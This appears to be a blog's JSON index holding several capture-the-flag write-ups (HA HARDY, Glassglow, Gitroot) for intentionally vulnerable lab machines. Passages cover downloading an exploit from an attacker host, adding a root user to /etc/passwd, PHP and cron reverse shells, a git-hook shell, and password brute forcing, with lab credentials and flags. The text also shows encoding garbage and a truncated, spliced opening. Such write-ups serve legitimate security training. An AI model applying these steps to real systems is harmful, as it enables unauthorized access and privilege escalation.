lets copy this exploit into our system â†’```bashwww-data@ubuntu:/tmp$ wget http://192.168.249.128:8888/exploit.py--2023-05-19 00:57:26-- http://192.168.249.128:8888/exploit.pyConnecting to 192.168.249.128:8888... connected.HTTP request sent, awaiting response... 200 OKLength: 8179 (8.0K) [text/x-python]Saving to: 'exploit.py'exploit.py 100%[===================>] 7.99K --.-KB/s in 0s 2023-05-19 00:57:26 (483 MB/s) - 'exploit.py' saved [8179/8179]www-data@ubuntu:/tmp$ lsexploit.pywww-data@ubuntu:/tmp$ python3 exploit.py 192.168.249.135Traceback (most recent call last): File \"exploit.py\", line 239, in extra_chunk_cnt = get_extra_chunk_count(CHUNK_CMND_SIZE) if len(sys.argv) extra_chunk_cnt = get_extra_chunk_count(CHUNK_CMND_SIZE) if len(sys.argv) If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "HA HARDY", "url": "/posts/HA-HARDY/", "categories": "Proving Grounds, Play", "tags": "Metasploit, Public Exploit, SUIDs, cp, wget, Wordpress, PrivEsc, CMS", "date": "2023-06-14 00:00:00 +0530", "snippet": "## Lets Check the IP address of the victim machine â¤µï¸![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled.png)```{: .nolineno}IP : 10.0.2.36```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-...", "content": "## Lets Check the IP address of the victim machine â¤µï¸![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled.png)```{: .nolineno}IP : 10.0.2.36```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/ha_hardy]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.36Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 21:19 ISTNmap scan report for 10.0.2.36Host is up (0.00060s latency).Not shown: 65534 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It worksMAC Address: 08:00:27:D4:FE:FC (Oracle VirtualBox virtual NIC)```{: .nolineno}## Web Enumeration â¬‡ï¸![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%201.png)got a directory â€”> `/wordpress/` ![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%202.png)with wpscan tool I got 2 users âž¡ï¸![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%203.png)I also found a vulnerability through wpscan in `reflex-gallery plugins` of wordpress so lets exploit it now >>![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%204.png)Now with metasploit I exploit this >>![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%205.png)![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%206.png)Now lets run this â¤µï¸![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%207.png)Now lets look into `wp-config.php` file âž¡ï¸![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%208.png)![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%209.png)Now letâ€™s see the SUIDâ€™s files âž¡ï¸![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%2010.png)So I think with this I will copy the /etc/passwd file , access with wget and modify with new user addon.Now letâ€™s access the passwd file in attackers machine â¤µï¸![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%2011.png)Now lets add a user named as `shiv` and `password`as password in passwd file. ![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%2012.png)Lets see the passwd file âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/ha_hardy]â””â”€$ cat passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinuuidd:x:105:111::/run/uuidd:/usr/sbin/nologinavahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologindnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinrtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologincups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologinspeech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falsewhoopsie:x:112:117::/nonexistent:/bin/falsekernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologinsaned:x:114:119::/var/lib/saned:/usr/sbin/nologinpulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinavahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologincolord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologinhplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/falsegeoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologingnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/falsegdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/falseraj:x:1000:1000:raj,,,:/home/raj:/bin/bashmysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:124:65534::/run/sshd:/usr/sbin/nologinshiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash```{: .nolineno}Now letâ€™s transfer this file âž¡ï¸![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%2013.png)![Untitled](/Vulnhub-Files/img/HA-HARDY/Untitled%2014.png)```bashroot@ubuntu:~# cat proof.txtcat proof.txt_________________________________________________________________________ _____ _ _ U _____ u U _____ u _ _ ____ \t|\t |_ \" _| |'| |'| \\| ___\"|/ \\| ___\"|/ | \\ |\"| | _\"\\ \t| | | /| |_| |\\ | _|\" | _|\" /| | | | \t|\t /| |\\ U| _ |u | |___ | |___ U| |\\ |u U| |_| |\\ \t| u |_|U |_| |_| |_____| |_____| |_| \\_| |____/ u \t| _// \\\\_ // \\\\ > > || \\\\,-. |||_ \t|(__) (__) (_\") (\"_) (__) (__) (__) (__) (_\") (_/ (__)_) \t|\t\t\t\t\t\t\t\t\t|\t\t\t\t\t\t\t\t\t|!! Congrats you have finished this task !!\t\t\t\t|\t\t\t\t\t\t\t\t\t|Contact us here:\t\t\t\t\t\t\t|\t\t\t\t\t\t\t\t\t|Hacking Articles : https://twitter.com/rajchandel/\t\t\t|\t\t\t\t\t\t\t\t\t|\t\t\t\t\t\t\t\t\t|+-+-+-+-+-+ +-+-+-+-+-+-+-+\t\t\t\t\t\t| |E|n|j|o|y| |H|A|C|K|I|N|G|\t\t\t\t\t\t| +-+-+-+-+-+ +-+-+-+-+-+-+-+\t\t\t\t\t\t|________________________________________________________________________| root@ubuntu:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Glassglow", "url": "/posts/Glassglow/", "categories": "Proving Grounds, Play", "tags": "Joomla, Password Generate, mysql, pspy64, PrivEsc, cewl, CMS", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the IP address of this Victim machine â†’![Untitled](/Vulnhub-Files/img/Glassglow/Untitled.png)```bashIP : 192.168.249.134```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[...", "content": "### Lets check the IP address of this Victim machine â†’![Untitled](/Vulnhub-Files/img/Glassglow/Untitled.png)```bashIP : 192.168.249.134```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Glasglow]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.134 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 00:38 EDTNmap scan report for 192.168.249.134Host is up (0.00055s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 6734481f250ed7b3eabb361122608fa1 (RSA)| 256 4c8c4565a484e8b1507777a93a960631 (ECDSA)|_ 256 09e994236097f720cceed6c19bda188e (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Site does not have a title (text/html).|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 00:0C:29:E0:E5:1E (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%201.png)while directory or files bruteforcing I got these directories â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Glasglow]â””â”€$ cat ferox_80.txt 1 âš™200 GET 8l 11w 125c http://192.168.249.134/200 GET 8l 11w 125c http://192.168.249.134/index.html301 GET 9l 28w 319c http://192.168.249.134/joomla => http://192.168.249.134/joomla/301 GET 9l 28w 326c http://192.168.249.134/joomla/images => http://192.168.249.134/joomla/images/301 GET 9l 28w 327c http://192.168.249.134/joomla/modules => http://192.168.249.134/joomla/modules/301 GET 9l 28w 325c http://192.168.249.134/joomla/media => http://192.168.249.134/joomla/media/301 GET 9l 28w 329c http://192.168.249.134/joomla/templates => http://192.168.249.134/joomla/templates/301 GET 9l 28w 323c http://192.168.249.134/joomla/bin => http://192.168.249.134/joomla/bin/301 GET 9l 28w 327c http://192.168.249.134/joomla/plugins => http://192.168.249.134/joomla/plugins/301 GET 9l 28w 328c http://192.168.249.134/joomla/includes => http://192.168.249.134/joomla/includes/301 GET 9l 28w 328c http://192.168.249.134/joomla/language => http://192.168.249.134/joomla/language/200 GET 72l 540w 4874c http://192.168.249.134/joomla/README.txt301 GET 9l 28w 330c http://192.168.249.134/joomla/components => http://192.168.249.134/joomla/components/301 GET 9l 28w 325c http://192.168.249.134/joomla/cache => http://192.168.249.134/joomla/cache/301 GET 9l 28w 329c http://192.168.249.134/joomla/libraries => http://192.168.249.134/joomla/libraries/200 GET 32l 111w 836c http://192.168.249.134/joomla/robots.txt301 GET 9l 28w 323c http://192.168.249.134/joomla/tmp => http://192.168.249.134/joomla/tmp/200 GET 339l 2968w 18092c http://192.168.249.134/joomla/LICENSE.txt301 GET 9l 28w 327c http://192.168.249.134/joomla/layouts => http://192.168.249.134/joomla/layouts/301 GET 9l 28w 333c http://192.168.249.134/joomla/administrator => http://192.168.249.134/joomla/administrator/200 GET 0l 0w 0c http://192.168.249.134/joomla/configuration.php200 GET 16l 96w 456c http://192.168.249.134/how_to.txt200 GET 80l 493w 3005c http://192.168.249.134/joomla/htaccess.txt301 GET 9l 28w 323c http://192.168.249.134/joomla/cli => http://192.168.249.134/joomla/cli/```{: .nolineno}Since it contains CMS as joomla so lets enumerate accordingly â€”>![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%202.png)![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%203.png)![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%204.png)So I have `Joomla! 3.7 version` âž¡ï¸Now lets login brute force this site â¤µï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%205.png)Now lets create a wordlists with cewl tool from the joomla web page âž¡ï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%206.png)Lets brute force this site using burpsuite and take username as `joomla` â¬‡ï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%207.png)![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%208.png)Now I got the password as `Gotham` , Lets login âž¡ï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%209.png)Now lets uplaod the reverse shell php code into Templates > Beez3 Details and Files > error.php â¬‡ï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2010.png)URL to load the reverse shell -> `http://192.168.249.134/joomla/templates/beez3/error.php`In response to that I got my reverse shell â†’![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2011.png)Now lets look into `configuration.php` file âž¡ï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2012.png)```bashjoomla : babyjoker```{: .nolineno}Lets look into the mysql database â€”>![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2013.png)I got `rob` as a user also so lets decode this encrypted value to get the password â¬‡ï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2014.png)```bashPz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/\t:\t???AllIHaveAreNegativeThoughts???```{: .nolineno}Now its rob time â†’```bashwww-data@glasgowsmile:/opt$ su robPassword: rob@glasgowsmile:/opt$ whoamirobrob@glasgowsmile:/opt$rob@glasgowsmile:~$ cat user.txtJKR[f5bb11acbb957915e421d62e7253d27a]rob@glasgowsmile:~$rob@glasgowsmile:~$ cat howtoberoot _____ ______ __ _ _ _ ____ ____ _____ ____ |_ _| _ \\ \\ / / | | | | / \\ | _ \\| _ \\| ____| _ \\ | | | |_) \\ V / | |_| | / _ \\ | |_) | | | | _| | |_) | | | | _ â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Glasglow]â””â”€$ echo \"STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==\" | base64 -dI33hope99my0death000makes44more8cents00than0my0life0```{: .nolineno}Now It abner shell time âž¡ï¸```bashabner@glasgowsmile:~$ whoamiabnerabner@glasgowsmile:~$ ls -altotal 44drwxr-xr-x 4 abner abner 4096 Jun 16 2020 .drwxr-xr-x 5 root root 4096 Jun 15 2020 ..-rw------- 1 abner abner 167 May 4 23:35 .bash_history-rw-r--r-- 1 abner abner 220 Jun 14 2020 .bash_logout-rw-r--r-- 1 abner abner 3526 Jun 14 2020 .bashrc-rw-r----- 1 abner abner 565 Jun 16 2020 info.txtdrwxr-xr-x 3 abner abner 4096 Jun 14 2020 .local-rw-r--r-- 1 abner abner 807 Jun 14 2020 .profiledrwx------ 2 abner abner 4096 Jun 15 2020 .ssh-rw-r----- 1 abner abner 38 Jun 16 2020 user2.txt-rw------- 1 abner abner 399 Jun 15 2020 .Xauthorityabner@glasgowsmile:~$ cat user2.txt JKR{0286c47edc9bfdaf643f5976a8cfbd8d}abner@glasgowsmile:~$```{: .nolineno}After so much try I got this file >>`/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip````bashabner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ ls -altotal 16drwxr-xr-x 2 root root 4096 Jun 16 2020 .drwxr-xr-x 5 root root 4096 Jun 16 2020 ..-rwxr-xr-x 1 abner abner 516 Jun 16 2020 .dear_penguins.zip-rwxr-xr-x 1 root root 1796 Jun 16 2020 joomla.xml```{: .nolineno}Transfered into the /tmp >>And I used the password of abner to unzip that file âž¡ï¸```bashabner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ cp .dear_penguins.zip /tmpabner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ cd /tmpabner@glasgowsmile:/tmp$ unzip .dear_penguins.zip Archive: .dear_penguins.zip[.dear_penguins.zip] dear_penguins password: (I33hope99my0death000makes44more8cents00than0my0life0) inflating: dear_penguins abner@glasgowsmile:/tmp$abner@glasgowsmile:/tmp$ lsdear_penguins pspy64abner@glasgowsmile:/tmp$abner@glasgowsmile:/tmp$ cat dear_penguins My dear penguins, we stand on a great threshold! It is okay to be scared; many of you would not be coming back. Thanks to Batman, the time has come to punish all of God is children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bzabner@glasgowsmile:/tmp$abner@glasgowsmile:/tmp$ su penguinPassword: penguin@glasgowsmile:/tmp$ cd ~penguin@glasgowsmile:~$ lsSomeoneWhoHidesBehindAMaskpenguin@glasgowsmile:~$ cd SomeoneWhoHidesBehindAMask/penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -altotal 332drwxr--r-- 2 penguin penguin 4096 Jun 16 2020 .drwxr-xr-x 5 penguin penguin 4096 Jun 16 2020 ..-rwSr----- 1 penguin penguin 315904 Jun 15 2020 find-rw-r----- 1 penguin root 1457 Jun 15 2020 PeopleAreStartingToNotice.txt-rwxr-xr-x 1 penguin root 612 Jun 16 2020 .trash_old-rw-r----- 1 penguin penguin 38 Jun 16 2020 user3.txtpenguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txtJKR{284a3753ec11a592ee34098b8cb43d52}```{: .nolineno}Now With pspy64 I got to know about the cron activity thorougly â†’![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2016.png)So lets see what this machine is running behind my back â†’![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2017.png)Now lets alter into `.trash_old` file so that I can have a root user â¤µï¸```bashpenguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old #!/bin/sh## ( ( ) ( * ( (# ( )\\ ) ( )\\ ) ( ( /( ( ( )\\ ) ( ` )\\ ))\\ )# )\\ ) (()/( )\\ (()/( )\\ ) )\\()))\\))( ' (()/( )\\))( (()/(()/( (#(()/( /(_)((((_)( /(_)(()/( ((_)\\((_)()\\ ) /(_)((_)()\\ /(_)/(_)))\\# /(_))_(_)) )\\ _ )\\(_)) /(_))_ ((__(())\\_)() (_)) (_()((_(_))(_)) ((_)#(_)) __| | (_)_\\(_/ __|(_)) __|/ _ \\ \\((_)/ / / __|| \\/ |_ _| | | __|# | (_ | |__ / _ \\ \\__ \\ | (_ | (_) \\ \\/\\/ / \\__ \\| |\\/| || || |__| _|# \\___|____|/_/ \\_\\|___/ \\___|\\___/ \\_/\\_/ |___/|_| |_|___|____|___|## exit 0Now lets add a reverse shell code to get to root ->```{: .nolineno}After adding the shell code âž¡ï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2018.png)In to response I got this â¬‡ï¸![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2019.png)```bash# cat root.txt â–„â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–“ â–„â–„â–„ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–„â–ˆâ–ˆâ–ˆâ–ˆ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ â–ˆâ–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–“â–ˆâ–ˆâ–“â–ˆâ–ˆâ–“ â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–’ â–€â–ˆâ–“â–ˆâ–ˆâ–’ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–„ â–’â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’ â–€â–ˆâ–’â–ˆâ–ˆâ–’ â–ˆâ–ˆâ–“â–ˆâ–‘ â–ˆ â–‘â–ˆâ–‘ â–’â–ˆâ–ˆ â–’â–“â–ˆâ–ˆâ–’â–€â–ˆâ–€ â–ˆâ–ˆâ–“â–ˆâ–ˆâ–“â–ˆâ–ˆâ–’ â–“â–ˆ â–€ â–’â–ˆâ–ˆâ–‘â–„â–„â–„â–’â–ˆâ–ˆâ–‘ â–’â–ˆâ–ˆ â–€â–ˆâ–„ â–‘ â–“â–ˆâ–ˆâ–„ â–’â–ˆâ–ˆâ–‘â–„â–„â–„â–’â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–’â–ˆâ–‘ â–ˆ â–‘â–ˆ â–‘ â–“â–ˆâ–ˆâ–„ â–“â–ˆâ–ˆ â–“â–ˆâ–ˆâ–’â–ˆâ–ˆâ–’â–ˆâ–ˆâ–‘ â–’â–ˆâ–ˆâ–ˆ â–‘â–“â–ˆ â–ˆâ–ˆâ–’â–ˆâ–ˆâ–‘ â–‘â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–‘â–“â–ˆ â–ˆâ–ˆâ–’â–ˆâ–ˆ â–ˆâ–ˆâ–‘â–ˆâ–‘ â–ˆ â–‘â–ˆ â–’ â–ˆâ–ˆâ–’â–ˆâ–ˆ â–’â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–’â–ˆâ–ˆâ–‘ â–’â–“â–ˆ â–„ â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–€â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–ˆ â–“â–ˆâ–ˆâ–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–€â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–‘â–ˆâ–ˆâ–’â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’ â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’ â–‘â–’ â–’â–‘ â–’â–‘â–“ â–’â–’ â–“â–’â–ˆâ–’ â–’â–“â–’ â–’ â–‘â–‘â–’ â–’â–‘ â–’â–‘â–’â–‘â–’â–‘â–‘ â–“â–‘â–’ â–’ â–’ â–’â–“â–’ â–’ â–‘ â–’â–‘ â–‘ â–‘â–“ â–‘ â–’â–‘â–“ â–‘â–‘ â–’â–‘ â–‘ â–‘ â–‘â–‘ â–‘ â–’ â–‘â–’ â–’â–’ â–‘ â–‘â–’ â–‘ â–‘ â–‘ â–‘ â–‘ â–’ â–’â–‘ â–’ â–‘ â–‘ â–‘ â–‘â–’ â–‘ â–‘ â–‘ â–‘â–’ â–‘ â–‘ â–’ â–‘â–‘ â–‘ â–‘â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–’ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘â–‘ â–‘ â–‘ â–’ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–’ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘ â–‘Congratulations!You have got the Glasgow Smile!JKR{68028b11a1b7d56c521a90fc18252995}Credits bymindsflee#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Gitroot", "url": "/posts/Gitroot/", "categories": "Proving Grounds, Play", "tags": "Password Bruteforce, git, Wordpress, PrivEsc, vhost, CMS, git-dumper", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**```{: .nolineno} .&&&&&&&%%&&& #&&%&%%%%%%%%%%%&&&( #&%%&%&%&%&%&%&%&%&%%&&( &&&%%%%%%%&(..#&&&%%%%%&&& #%&%&%&&&/ (&&&&%&&&* %...", "content": "## **Description â¤µï¸**```{: .nolineno} .&&&&&&&%%&&& #&&%&%%%%%%%%%%%&&&( #&%%&%&%&%&%&%&%&%&%%&&( &&&%%%%%%%&(..#&&&%%%%%&&& #%&%&%&&&/ (&&&&%&&&* %&%&%&%%&&@* %&%%%%%&& &&%%%&%%# (&&&&%%%%%%%%%%%&&& (%&%&%&&%% %%&%&%&%%, %&&&%&%&%&&&%&%&%&%&%&&. %%%%%%%%%&%&(#&%%%%%%%%%&# &&%%%%%%%&&#/(%%&%&%%%%%&( *&%%&%&%&%&%%&&%&%&%&&%. #&%&%&%&&, &%%&%&%&&. .&&&%%%%%%%%%%%%%%% &&&%%%%%& %%%%%%%&/ ,%&%&%&%%%#, #&%&%&%&&* &&%&%&%%&. .&%%%%%&&. &&%%%%%%&%&(*/%&&%&%%%%%&( .&%&%&%&&. %&&%%&%&%&%&%&%&%&%&&%%. .&%%%%%&&. (&&%&%%%%%%%%%%%&&& .&%&%&%&&. gitroot by .#&&&%&%&%&&* .%%%%%%&&. RECURSIVENULL &%%%%%%&@ .&%&%&%%%. %&%&%&%%/ .&%%%%%%%( &&%%%%%%& .&%&%&%&%&& #&&&%&%&&&& .%%%%%%%%%&%&&&&&&%%&&&&&&&&&&&%&%&&%%%%%%%%%& .%&&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&%&&& %%&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&&%&&&&/ &%%%&%&%&%&%&%&%&%&%&%&@@&&&&%#((/*,,.. .&%%%%%%%&%&(*/&%%%%%%%%%%. &%&%&%&%& &%&%&%&&& &%%%%%%&* *%%%%%&&& &&&%&%&&& &%&%&%&%& ,%%%%%%%&&%&(/#&%%&%%%%%%%. &&&%&%&%&%&%&%&%&%&%&&& &%&%%%%%%%%%%%%%&&& ,&%&&%&&&%%&.```{: .nolineno}>ðŸ’¡ [Gitroot : 1](https://www.vulnhub.com/entry/gitroot-1,488/) âž¡ï¸The theme of this box is git.The design of this box is HTB-like.I will NOT be giving hints. Like a wise man once said \"Try Harder\"**Goals:**- Get a low privilege shell and read /home/pablo/user.txt- Get a root shell and read /root/root.txt**Difficulty:** IntermediateThis box only works on VirtualBoxDHCP is enabledAll of the users on this box are named after my teachers and mentors, thank you Pablo, Beth, and Jen.Have Fun!This works better with VirtualBox rather than VMware.{: .prompt-tip }### Letâ€™s find the IP Address first >>![169-1.png](/Vulnhub-Files/img/Gitroot/169-1.png)```bashIP : 10.0.2.22```{: .nolineno}## Port Scan Results âž¡ï¸![169-2.png](/Vulnhub-Files/img/Gitroot/169-2.png)```bashOPEN PORTS >22 SSH80 HTTP11211 memcache?```{: .nolineno}---## Web Enumeration â¤µï¸![169-3.png](/Vulnhub-Files/img/Gitroot/169-3.png)Results from WPSCAN â†’![169-4.png](/Vulnhub-Files/img/Gitroot/169-4.png)```bashuser â†’ beth â†```{: .nolineno}Lets look into vhosting enumeration through `ffuf` Tool specialy for subdomains â†’![169-5.png](/Vulnhub-Files/img/Gitroot/169-5.png)Now it is time to add the `/etc/hosts` with a new entry â†’![169-6.png](/Vulnhub-Files/img/Gitroot/169-6.png)![169-7.png](/Vulnhub-Files/img/Gitroot/169-7.png)Now lets find out about git files â†’![169-8.png](/Vulnhub-Files/img/Gitroot/169-8.png)![169-9.png](/Vulnhub-Files/img/Gitroot/169-9.png)Now I got 3 names lets brute-force the ssh port for find the password â†’![169-10.png](/Vulnhub-Files/img/Gitroot/169-10.png)It will take too much time with rockyou.txt file so I customized the file â†’```bashpablo : mastergitar```{: .nolineno}___## SHELL âž¡ï¸![169-11.png](/Vulnhub-Files/img/Gitroot/169-11.png)Here is `user.txt` file â†’![169-12.png](/Vulnhub-Files/img/Gitroot/169-12.png)![169-13.png](/Vulnhub-Files/img/Gitroot/169-13.png)Now lets look for `.git` Folder and files â†’To view all files content of the Directory try this command â†’```bashcat `ls` -n```{: .nolineno}![169-14.png](/Vulnhub-Files/img/Gitroot/169-14.png)![169-15.png](/Vulnhub-Files/img/Gitroot/169-15.png)Now I have the password for beth I think so lets try it out â†’```bashbeth : r3vpdmspqdb```{: .nolineno}Now I got in â†’![169-16.png](/Vulnhub-Files/img/Gitroot/169-16.png)![169-17.png](/Vulnhub-Files/img/Gitroot/169-17.png)Now lets do the same and for that I have to create a reverse shell file named as **post-commit** â†’ ![169-18.png](/Vulnhub-Files/img/Gitroot/169-18.png)Now its time to copy it that location and wait for the reverse shell to trigger â†’![169-19.png](/Vulnhub-Files/img/Gitroot/169-19.png)![169-20.png](/Vulnhub-Files/img/Gitroot/169-20.png)Now lets see what jen got â†’After checking this file â†’![169-21.png](/Vulnhub-Files/img/Gitroot/169-21.png)![169-22.png](/Vulnhub-Files/img/Gitroot/169-22.png)```bashjen : binzpbeocnexoe```{: .nolineno}Now lets see how jen can lead me to root â†’![169-23.png](/Vulnhub-Files/img/Gitroot/169-23.png)Now run this command â†’![169-24.png](/Vulnhub-Files/img/Gitroot/169-24.png)![169-25.png](/Vulnhub-Files/img/Gitroot/169-25.png)root.txt 